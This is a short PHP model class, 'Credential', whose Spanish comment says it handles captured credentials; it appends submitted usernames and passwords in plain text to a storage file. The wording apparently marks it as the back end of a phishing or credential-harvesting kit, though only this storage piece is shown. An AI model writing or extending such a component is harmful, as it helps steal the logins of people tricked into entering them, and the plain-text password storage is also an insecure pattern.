<?php
// Credential.php - Modelo para manejar las credenciales capturadas

namespace App\Models;

class Credential {
    public function store($username, $password) {
        $file = '../storage/data/credentials.txt';
        $data = "Username: $username | Password: $password\n";
        file_put_contents($file, $data, FILE_APPEND);
    }
}
?>
